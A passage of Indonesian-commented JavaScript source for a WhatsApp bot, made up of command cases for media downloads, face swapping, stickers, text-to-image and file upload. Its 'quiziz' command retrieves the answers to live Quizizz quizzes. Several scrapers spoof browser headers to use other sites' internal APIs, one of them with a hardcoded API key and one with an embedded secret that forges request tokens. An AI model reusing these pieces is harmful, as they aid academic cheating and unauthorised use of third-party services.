            await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            Sky.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
            }
            break

//==================================================================================

//*(Fitur Search Meme(Case))*
//*[ Sumber ]* https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v
case "soundmeme": {
 if (!q) return m.reply(example("eits siapa tuch"));
 let args = q.split(" ");
 let limit = parseInt(args[args.length - 1]); 
 let searchQuery = isNaN(limit) ? q : args.slice(0, -1).join(" "); 
 let url = `https://api.agungny.my.id/api/memesound?q=${encodeURIComponent(searchQuery)}`;
 try {
 let res = await fetch(url);
 let json = await res.json();
 if (!json.status || !json.result.length) return m.reply("Meme tidak ditemukan!");
 let results = isNaN(limit) ? json.result : json.result.slice(0, limit);
 let message = "🎵 *Hasil Pencarian:*\n\n";
 for (let i = 0; i < results.length; i++) {
 message += `🎶 *${results[i].text}*\n🔗 (${results[i].url})\n\n`;
 await Sky.sendMessage(m.chat, { audio: { url: results[i].audioUrl }, mimetype: "audio/mpeg" });
 }
 m.reply(message);
 } catch (err) {
 console.error(err);
 m.reply("Terjadi kesalahan saat mencari meme. [ Meme tidak ditemukan ]");
 }
}
break

//====================================================================================
    
 case 'faceswap' : {
async function faceswap(original, target){
	const API_URL = 'https://supawork.ai/supawork/headshot/api';
	const MAX_RETRIES = 10;
	const RETRY_DELAY = 5000;

	const headers = {
		accept: 'application/json',
		'accept-language': 'id;q=0.5',
		authorization: 'null',
		'content-type': 'application/json',
		origin: 'https://supawork.ai',
		referer: 'https://supawork.ai/ai-face-swap',
		'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Brave";v="134"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'user-agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36'
	};

	const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

   
	try {
		const identityID = uuidv4();
		const postData = {
			aigc_app_code: 'face_swap_single',
			face_swap_type: 'single',
			target_image_url: original,
			target_face_url: target,
			identity_id: identityID,
			currency_type: 'silver'
		};

		const postResponse = await axios.post(`${API_URL}/fs/faceswap`, postData, {
			headers
		});
		if (postResponse.data.code !== 100000) {
			return {
				status: postResponse.status,
				error: postResponse.data.message || 'API error'
			};
		}

		for (let i = 0; i < MAX_RETRIES; i++) {
			await delay(RETRY_DELAY);
			const getResponse = await axios.get(`${API_URL}/media/aigc/result/list/v1`, {
				headers,
				params: {
					page_no: 1,
					page_size: 20,
					identity_id: identityID
				}
			});

			if (getResponse.data.code !== 100000) {
				return {
					status: getResponse.status,
					error: getResponse.data.message || 'API error'
				};
			}

			const found = getResponse.data.data.list.find(
				(item) => item.list[0].input_urls.includes(original) &&
				item.list[0].input_urls.includes(target) &&
				item.list[0].status === 1
			);

			if (found) {
				return {
					status: 200,
					data: {
						url: found.list[0].url[0],
						request_id: postResponse.data.data.request_id
					}
				};
			}
		}

		return {
			status: 200,
			error: 'Result not found within time limit'
		};
	} catch (error) {
		return {
			status: error.response?.status || 500,
			error: error.message || 'Internal server error'
		};
	}
}

 if (!args[0] || !args[1]) return m.reply(`Silahkan masukkan 2 URL gambar!\n\nContoh: .faceswap [URL foto target] [URL wajah]`);
 
 const originalImgUrl = args[0];
 const targetFaceUrl = args[1];
 
 m.reply('*Melakukan Faceswap Tunggu 10-50 Detik Yaa*...');
 
 try {
 const result = await faceswap(originalImgUrl, targetFaceUrl);
 
 if (result.error) {
 return m.reply(`Gagal melakukan face swap : ${result.error}`);
 }
 
 if (result.data && result.data.url) {
 await Sky.sendMessage(m.chat, { 
 image: { url: result.data.url }
 }, { quoted: m });
 } else {
 m.reply('Terjadi kesalahan saat memproses gambar.');
 }
 } catch (e) {
 m.reply(`Error: ${e.message}`);
 }
};
break

//====================================================================================
    
case "gdrive": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply(example("linknya"))
try {
    const res = await fetchJson(`https://restapi-v2.simplebot.my.id/download/gdrive?url=${text}`)
   await Sky.sendMessage(m.chat, { document: { url: res.result.downloadUrl }, mimetype: res.result.mimetype, fileName: `${res.result.fileName}`}, { quoted : m })
} catch (e) {
console.error(e);
await m.reply(`Error! result tidak ditemukan`)
}}
break
    
//======================================================================
case 'fb': case 'facebook': case 'fbdl':
case 'ig': case 'instagram': case 'igdl': {
    if (!args[0]) return m.reply(example("URL Facebook atau Instagram"));
    try {
        const axios = require('axios');
        const cheerio = require('cheerio');
        async function yt5sIo(url) {
            try {
                const form = new URLSearchParams();
                form.append("q", url);
                form.append("vt", "home");
                const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
                    headers: {
                        "Accept": "application/json",
                        "X-Requested-With": "XMLHttpRequest",
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                });
                if (data.status !== "ok") throw new Error("Gagal mengambil data.");
                const $ = cheerio.load(data.data);
                if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
                    const thumb = $('img').attr("src");
                    let links = [];
                    $('table tbody tr').each((_, el) => {
                        const quality = $(el).find('.video-quality').text().trim();
                        const link = $(el).find('a.download-link-fb').attr("href");
                        if (quality && link) links.push({ quality, link });
                    });
                    if (links.length === 0) throw new Error("Tidak ada video yang dapat diunduh.");

                    return { platform: "facebook", thumb, video: links[0].link };
                } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
                    const video = $('a[title="Download Video"]').attr("href");
                    const thumb = $('img').attr("src");
                    if (!video || !thumb) throw new Error("Video tidak ditemukan.");
                    return { platform: "instagram", thumb, video };
                } else {
                    throw new Error("URL tidak valid. Gunakan link Facebook atau Instagram.");
                }
            } catch (error) {
                return { error: error.message };
            }
        }
        await Sky.sendMessage(m.chat, {
            react: {
                text: "🕒",
                key: m.key,
            }
        });
        let res = await yt5sIo(args[0]);
        if (res.error) {
            await Sky.sendMessage(m.chat, {
                react: {
                    text: "❌",
                    key: m.key,
                }
            });
            return m.reply(`⚠ *Error:* ${res.error}`);
        }
        if (res.platform === "facebook" || res.platform === "instagram") {
            await Sky.sendMessage(m.chat, {
                react: {
                    text: "🕒",
                    key: m.key,
                }
            });
            await Sky.sendMessage(m.chat, { video: { url: res.video }, caption: "✅ *Berhasil mengunduh video!*" }, { quoted: m });
        }
    } catch (error) {
        console.error(error);
        await Sky.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key,
            }
        });
        m.reply("Terjadi kesalahan saat mengambil video.");
    }
}
break
//====================================================================================
    
    
/*
*(Case Get Answer From Quiziz)* { biyu mode sok Inggris 🗿}
* Kyk ngambil jawaban dari kode quiziz 😈😈

[ Sumber ] https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v
*/

case "quiziz":
 if (!q) return m.reply("Masukkan kode Quizizz!\nContoh: .quiziz 32993496");
 
 let apiUrl = `https://api.maelyn.tech/api/quizizz?pin=${q}&apikey=Mbv133tl1l`;
 
 try {
 let response = await fetch(apiUrl);
 let data = await response.json();
 
 if (data.status !== "Success") return m.reply("Gagal mengambil data Quizizz.");

 let result = data.result;
 if (!result.length) return m.reply("Tidak ada soal yang ditemukan.");
 
 let message = `📚 *Quizizz (${q})*\n\n`;
 
 for (let i = 0; i < result.length; i++) {
 let soal = result[i].question.text;
 let jawaban = result[i].answer.text;
 message += `*Soal ${i + 1}:* ${soal}\n*Jawaban:* ${jawaban}\n\n`;
 }
 
 m.reply(message);
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat mengambil data Quizizz.");
 }
 break
    
//=========================================
    
 /*
*(Fitur AudioSurat(Case))*

[ Sumber ] https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v
*/

case "audiosurah": case "audiosurat": {
	let wrong = `_*Contoh Penggunaan :*_\n.audiosurah 1

*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`
   if (!text) return m.reply(`${wrong}`)
      await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
   Sky.sendMessage(m.chat, { audio: { url: `https://api.vreden.my.id/api/islami/quranaudio?nomor=${text}` }, mimetype: 'audio/mp4' }, { quoted: m });
 await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})

}
break
    
//=========================================
    
//*[ Fitur Qc {background custom}]*

//*[ Sumber ]* https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v

case "qcwarna": {
 if (!text) return m.reply(example(
 `*Format:* .qcwarna teks | #kodewarna\n\n` +
 `*Contoh Penggunaan:*\n` +
 `*qcwarna Halo | #FF0000* \n` +
 `*Daftar Warna:*\n` +
 `*Hitam* → #000000\n` +
 `*Putih (Default)* → #FFFFFF\n` +
 `*Merah* → #FF0000\n` +
 `*Hijau* → #00FF00\n` +
 `*Biru* → #0000FF\n` +
 `*Kuning* → #FFFF00\n` +
 `*Cyan (Biru Muda)* → #00FFFF\n` +
 `*Magenta (Ungu Pink)* → #FF00FF\n` +
 `*Abu-Abu* → #808080\n` +
 `*Coklat* → #8B4513\n` +
 `*Oranye* → #FFA500\n` +
 `*Pink* → #FFC0CB\n` +
 `*Ungu* → #800080\n` +
 `*Biru Tua* → #00008B\n` +
 `*Hijau Tua* → #006400\n` +
 `*Merah Gelap* → #8B0000\n` +
 `Selain warna di list tersebut, anda juga bisa mencari warna lain di website ini:https://htmlcolorcodes-com.translate.goog/colors/?_x_tr_sl=en&_x_tr_tl=id&_x_tr_hl=id&_x_tr_pto=tc\nSalin kode HEX/HEXADESIMAL nya`
 ));
 let warna = "#FFFFFF"; 
 let teks = text;
 if (text.includes("|")) {
 let splitText = text.split("|").map(t => t.trim());
 teks = splitText[0];
 let warnaInput = splitText[1];
 if (/^#([0-9A-F]{6})$/i.test(warnaInput)) {
 warna = warnaInput;
 }
 }
 var ppuser;
 try {
 ppuser = await Sky.profilePictureUrl(m.sender, 'image');
 } catch (err) {
 ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg';
 }
 const json = {
 "type": "quote",
 "format": "png",
 "backgroundColor": warna,
 "width": 812,
 "height": 968,
 "scale": 2,
 "messages": [
 {
 "entities": [],
 "avatar": true,
 "from": {
 "id": 1,
 "name": m.pushName,
 "photo": {
 "url": ppuser
 }
 },
 "text": teks,
 "replyMessage": {}
 }
 ]
 };
 const axios = require('axios');
 axios.post('https://bot.lyo.su/quote/generate', json, {
 headers: {'Content-Type': 'application/json'}
 }).then(async (res) => {
 const buffer = Buffer.from(res.data.result.image, 'base64');
 let tempnya = "./library/database/sampah/" + m.sender + ".png";
 await fs.writeFile(tempnya, buffer, async (err) => {
 if (err) return m.reply("Error");
 await Sky.sendAsSticker(m.chat, tempnya, m, { packname: global.packname });
 await fs.unlinkSync(`${tempnya}`);
 });
 }).catch(err => {
 m.reply("Gagal membuat quote, coba lagi!");
 });
}
break
    
//=========================================
    
/*
*(Fitur Kisah Nabi(Case))*

[ Sumber ] https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v

*/
case "kisahnabi": {
if (!text) return m.reply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return m.reply("*Not Found*")

let hasil = `*👳 Nabi :* ${kisah.name}
*- Tanggal Lahir :* ${kisah.thn_kelahiran}
*- Tempat Lahir :* ${kisah.tmp}
*- Usia :* ${kisah.usia}

*—————— \`[ K I S A H ]\` ——————*

${kisah.description}`

m.reply(`${hasil}`)

}
break
    
//=========================================
    
/*
Jangan Hapus Wm Bang 

*Text2img Plugins Esm*

Folow Bantu 600p

*[Sumber]*
https://whatsapp.com/channel/0029Vb3u2awADTOCXVsvia28

*[Sumber Scrape]*

https://whatsapp.com/channel/0029VafnytH2kNFsEp5R8Q3n/303
*/
case 'texttoimg' : case 'text2img' : {
const axios = require('axios');
const cheerio = require('cheerio');
const translate = require('bing-translate-api');
const BASE_URL = "https://www.texttoimage.org";

const headers = {
  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
  Origin: "https://www.texttoimage.org",
  Referer: "https://www.texttoimage.org/",
  "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
};

async function text2img(prompt) {
  if (!prompt) return "Where is the prompt param?";
  try {
    let q = new URLSearchParams({
      prompt,
    });
    let { data } = await axios.post(`${BASE_URL}/generate`, q, {
      headers,
    });
    let html = await axios.get(`${BASE_URL}/${data.url}`, { headers });
    const $ = cheerio.load(html.data);
    let result = BASE_URL + $(".image-container").find("img").attr("src");
    return {
      status: true,
      result,
    };
  } catch (e) {
    return {
      status: false,
      result: "An error occurred! Server down."
    };
  }
}


  if (!text) return m.reply('Mau Buat Gambar Apa?\n\n *Example Use :* .texttoimg pemandangan indah dengan pegunungan');
  
  m.reply('Processing the image. Please wait a moment.');
  
  try {
    const translatedText = await translate.translate(text, 'id', 'en');

    const response = await text2img(translatedText.translation);
    
    if (response.status) {
      await Sky.sendMessage(m.chat, { 
        image: { url: response.result },
      }, { quoted: m });
    } else {
      m.reply(`Failed to generate image: ${response.result}`);
    }
  } catch (err) {
 console.error(err);
 m.reply(`Terjadi kesalahan!! laporkan teks ini ke owner: ${err.message}`);
 }
};

break
    
//========================================
    
case "sfile": {
  if (!text) return m.reply(`Example: ${prefix + command} query`);
  try {
    let api = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/search/sfile?q=${text}`);
    let data = await api.json();
    if (!data.status) return m.reply('Search failed! Try again later.');
    if (data.result.length === 0) return m.reply('No files found!');
    
    let teks = `乂 *SFILE SEARCH* ◦\n\n`;
    data.result.slice(0, 25).forEach((file, index) => {
      teks += `乂 *${index + 1}.* ${file.filename}\n`;
      teks += `乂 *Url* : ${file.url}\n\n`;
    });
    
    await Sky.sendMessage(m.chat, { text: teks }, { quoted: m });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break
    
//========================================
    
case 'report' : {
if (!text.includes("|")) return m.reply('Ketik .report commandnya|teks erornya\nContoh\n.report .qcwarna|conn is not defined')
let splitText = text.split("|").map(t => t.trim());
const command = splitText[0];
const eror = splitText[1];
let Obj = global.owner
  Sky.sendMessage(Obj + "@s.whatsapp.net", {
    text: `*Hallo developer, telah terjadi error pada command :*${command} \n *Detail informasi error :* ${eror}\nDilaporkan Oleh: @${m.sender.split("@")[0]}\n> Note : Jika tidak tau artinya ketik translate id TEXT`,
    contextInfo: { isForwarded: true }
  }, { quoted: m })
await Sky.sendMessage(m.chat, { text: `Berhasil melaporkan bug!\nTunggu info lebih lanjut di saluran bot`}, {quoted:m})
}
break
    
//========================================
    
case 'react' : {
    try {
const reactionMessage = {
react: {
text: `${text}`,
key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
}
}
Sky.sendMessage(m.chat, reactionMessage), {quoted: m}
} catch (err) {
 console.error(err);
 m.reply(`Terjadi kesalahan!! laporkan teks ini ke owner: ${err.message}`);
 }
}
break

//======================================
    
case 'react2' : {
    try {
let splitText = text.split("|").map(t => t.trim());
const emoji = splitText[0];
const messageId = splitText[1];
const reactionMessage = {
react: {
text: `${emoji}`,
key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
}
}
Sky.sendMessage(m.chat, reactionMessage, messageId), {quoted: m}
} catch (err) {
 m.reply(`Terjadi kesalahan!! laporkan teks ini ke owner: ${err.message}`);
 console.error(err);
 }
}
break
    
//=====================================
/*
*{ CASE REACT CH MEMAKAI FONT }*

SUMBER CASE
https://whatsapp.com/channel/0029VaxCZ9I9cDDdrAIznL0S

Ini gua di kasih cuma gua convert aja🗿
*/
case "reactionch": case "reactch": {
 if (!text || !args[0] || !args[1]) 
 return m.reply("Contoh penggunaan:\n.reactch https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v/4054 halo dunia 🗿")
 if (!args[0].includes("https://whatsapp.com/channel/")) 
 return m.reply("Link tautan tidak valid")

    const hurufGaya = {
        a: '🄰', b: '🄱', c: '🄲', d: '🄳', e: '🄴', f: '🄵', g: '🄶',
        h: '🄷', i: '🄸', j: '🄹', k: '🄺', l: '🄻', m: '🄼', n: '🄽',
        o: '🄾', p: '🄿', q: '🅀', r: '🅁', s: '🅂', t: '🅃', u: '🅄',
        v: '🅅', w: '🅆', x: '🅇', y: '🅈', z: '🅉',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒', ' ':'⊟'
    };

    const emojiInput = args.slice(1).join(' ').toLowerCase();
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return hurufGaya[c] || c;
    }).join('');

    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];

        const res = await Sky.newsletterMetadata("invite", channelId);
        await Sky.newsletterReactMessage(res.id, messageId, emoji);

        return m.reply(`Berhasil mengirim reaction *${emoji}* ke pesan di channel *${res.name}*.`);
    } catch (e) {
        console.error(e);
        return m.reply("Gagal mengirim reaction. Pastikan link dan emoji valid.");
    }
};
break
    
//=====================================
    
case "img": case "toimg": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let foto = await Sky.downloadAndSaveMediaMessage(qmsg)
let result = await fs.readFileSync(foto)
await Sky.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//=====================================
    
case "mp4": case "tomp4": {
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
var image = await Sky.downloadAndSaveMediaMessage(qmsg)
await Sky.sendMessage(m.chat, image, m, {quoted: m})
await fs.unlinkSync(image)
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break
//=======================================
    
case 'creategc': case 'buatgc': case 'buatgrup': case 'buatgb': {
    if (!isCreator) return m.reply('Khusus Creator/Owner');
    
    let parts = text.split('|');
    let groupName = parts[0]?.trim();
    let groupDesc = parts[1]?.trim() || '';
    
    if (!groupName) {
        return m.reply(`Cara penggunaan: 
${prefix + command} NamaGroup|DeskripsiGroup

- Pisahkan nama dan deskripsi grup dengan simbol | 
- Deskripsi grup bersifat opsional

Contoh: 
${prefix + command} Grup Keren|Grup untuk diskusi keren`);
    }
    
    try {
        let groupData = await Sky.groupCreate(groupName, []);
       
        await new Promise(resolve => setTimeout(resolve, 1000));
        
      
        if (groupDesc) {
            await Sky.groupUpdateDescription(groupData.id, groupDesc);
        }
       
        let hasSetPicture = false;
        if (m.quoted && /image/.test(m.quoted.mimetype)) {
            try {
                let media = await m.quoted.download();
                await Sky.updateProfilePicture(groupData.id, media);
                hasSetPicture = true;
            } catch (pictureError) {
                console.error('Error setting group picture:', pictureError);
            }
        }
        
        
        let response = await Sky.groupInviteCode(groupData.id);
        let inviteLink = `https://chat.whatsapp.com/${response}`;
                let successDetails = [];
        successDetails.push(`✅ Grup "${groupName}" berhasil dibuat!`);
        
        if (groupDesc) {
            successDetails.push(`✅ Deskripsi grup berhasil diatur`);
        }
        
        successDetails.push(`\nLink grup: ${inviteLink}`);
        
      
        await Sky.sendMessage(m.chat, {
            text: successDetails.join('\n'),
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999999, 
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterName: 'RafzBotz',
                    newsletterJid: global.idSaluran,
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: groupName,
                    body: groupDesc || 'Grup Berhasil Dibuat!',
                    thumbnailUrl: global.image.menu, 
                    sourceUrl: inviteLink,
                    mediaType: 15,
                    renderLargerThumbnail: true
                }
            }
        });
    } catch (error) {
        console.error('Error creating group:', error);
        m.reply(`Gagal membuat grup: ${error.message}`);
    }
}
break
    
//========================================
    
case "cekidchnew": case "idchnew": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Sky.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break
    
//=========================================

/*
📌 Nama Fitur: Uploader Url All Type
📝 Deskripsi: case untuk upload semua jenis media ke web CloudkuImages
🔗 sumber : https://whatsapp.com/channel/0029VasjrIh3gvWXKzWncf2P
✍️ Code by FlowFalcon

🌐 Web Uploader : cloudkuimages.com
📥 Install Module : npm i cloudku-uploader
*/
case 'tourlall': {
 if (!m.quoted) return m.reply("🚨 Reply media atau teks yang ingin diunggah!");
 
 try {
 const { uploadFile } = require('cloudku-uploader');
 const { Buffer } = require('buffer');

 let q = m.quoted;
 let mime = (q.msg || q).mimetype || '';
 let fileBuffer, fileName;

 if (mime) {
 fileBuffer = await q.download();
 let ext = mime.split('/')[1] || 'bin';
 fileName = `upload.${ext}`;
 } else if (q.text) {
 fileBuffer = Buffer.from(q.text, 'utf-8');
 fileName = 'upload.txt';
 } else {
 return m.reply("🚨 Tidak ada media atau teks yang ditemukan!");
 }

 await m.reply("⏳ Mengupload file ke CloudkuImages...");
 console.log(`🚀 Mengupload file ${fileName}...`);
 const result = await uploadFile(fileBuffer, fileName);

 if (result.status === "success") {
 return m.reply(`✅ *File berhasil diunggah!*\n\n📮 *L I N K :* ${result.url}\n📂 *File Name :* ${result.fileName}\n📊 *S I Z E :* ${result.Size} Byte\n📛 *T Y P E :* ${result.type}`);
 } else {
 return m.reply(`🚨 Gagal mengupload file! Server response: ${JSON.stringify(result)}`);
 }
 } catch (e) {
 console.error(e);
 return m.reply("🚨 Terjadi kesalahan saat mengupload file!");
 }
}
break
    
//===========================================
    
// Work Video/Gambar/Story FB||IG
case 'fb2': case 'facebook2': case 'fbdl2':
case 'ig2': case 'instagram2': case 'igdl2': {
 if (!args[0]) return m.reply("🔗 Masukkan URL Facebook atau Instagram!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("Gagal mengambil data.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("Tidak ada media yang dapat diunduh.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media tidak ditemukan.");
 }
 } else {
 throw new Error("URL tidak valid. Gunakan link Facebook atau Instagram.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await Sky.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(args[0]);
 if (res.error) {
 await Sky.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return m.reply(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await Sky.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await Sky.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *Berhasil mengunduh video!*" }, { quoted: m });
 } else if (res.type === "image") {
 await Sky.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await Sky.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ *Berhasil mengunduh gambar!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await Sky.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 m.reply("Terjadi kesalahan saat mengambil media.");
 }
}
break
    
//==========================================
    
 /*
Jangan Hapus Wm Bang 

*Talknotes Plugins Esm*

Intinya Audio/Video To Text 

*[Sumber]*
https://whatsapp.com/channel/0029Vb3u2awADTOCXVsvia28

*[Sumber Scrape]*

ZERvida

*Question :* Racun Kalau Expired Makin Beracun Apa Gak Beracun 
*/
case 'audiototeks' : case 'audio2teks' : case 'mp4toteks' : case 'mp42teks' : case 'talknotes' : case 'audiototext' : case 'audio2text' : case 'mp4totext' : case 'mp42text' : {
const crypto = require('crypto');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');

  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || '';
  
 function generateToken(secretKey) {
  const timestamp = Date.now().toString();
  const hmac = crypto.createHmac('sha256', secretKey);
  hmac.update(timestamp);
  const token = hmac.digest('hex');

  return {
    "x-timestamp": timestamp,
    "x-token": token
  };
}
    
 async function Talknotes(buffer) {
  try {
    const form = new FormData();
    form.append('file', buffer, {
      filename: 'file1.mp3',
      contentType: 'audio/mpeg'
    });

    const tokenData = generateToken('w0erw90wr3rnhwoi3rwe98sdfihqio432033we8rhoeiw');
    const headers = {
      ...form.getHeaders(),
      'x-timestamp': tokenData['x-timestamp'],
      'x-token': tokenData['x-token'],
      "authority": "api.talknotes.io",
      "method": "POST",
      "path": "/tools/converter",
      "scheme": "https",
      "accept": "*/*",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
      "origin": "https://talknotes.io",
      "referer": "https://talknotes.io/",
      "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"
    };

    const response = await axios.post('https://api.talknotes.io/tools/converter', form, { headers });
    return response.data;
  } catch (error) {
    console.error("An error occurred:", error.message);
    return null;
  }
  }

    
  if (!/audio|video/.test(mime)) {
